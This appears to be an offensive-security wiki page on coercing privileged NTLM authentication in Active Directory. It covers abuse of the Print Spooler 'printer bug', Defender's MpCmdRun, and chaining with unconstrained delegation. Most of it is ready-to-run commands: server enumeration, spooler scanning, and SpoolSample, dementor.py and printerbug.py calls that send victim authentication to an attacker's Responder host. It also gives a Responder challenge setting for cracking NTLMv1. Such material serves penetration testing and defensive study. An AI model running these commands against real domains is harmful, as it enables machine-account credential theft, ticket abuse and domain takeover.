# Force NTLM Privileged Authentication

## Spooler Service Abuse

If the _**Print Spooler**_ service is **enabled,** you can use some already known AD credentials to **request** to the Domain Controller’s print server an **update** on new print jobs and just tell it to **send the notification to some system**.  
Note when printer send the notification to an arbitrary systems, it needs to **authenticate against** that **system**. Therefore, an attacker can make the _**Print Spooler**_ service authenticate against an arbitrary system, and the service will **use the computer account** in this authentication.

### Finding Windows Servers on the domain

Using PowerShell, get a list of Windows boxes. Servers are usually priority, so lets focus there:

```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```

### Finding Spooler services listening

Using a slightly modified @mysmartlogin's \(Vincent Le Toux's\) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), see if the Spooler Service is listening:

```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```

You can also use rpcdump.py on Linux and look for the MS-RPRN Protocol

```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```

### Ask the service to authenticate against an arbitrary host

You can compile[ **SpoolSample from here**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**

```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```

or use [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket)  or [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) if you're on Linux

```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```

### Combining with Unconstrained Delegation

If an attacker has already compromised a computer with [Unconstrained Delegation](unconstrained-delegation.md), the attacker could **make the printer authenticate against this computer**. Due to the unconstrained delegation, the **TGT** of the **computer account of the printer** will be **saved in** the **memory** of the computer with unconstrained delegation. As the attacker has already compromised this host, he will be able to **retrieve this ticket** and abuse it \([Pass the Ticket](pass-the-ticket.md)\).

## Inside Windows

If you are already inside the Windows machine you can force Windows to connect to a server using privileged accounts with:

### Defender MpCmdRun

```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```

## Cracking NTLMv1

If you can capture [NTLMv1 challenges read here how to crack them](../ntlm/#ntlmv1-attack).  
_Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"_

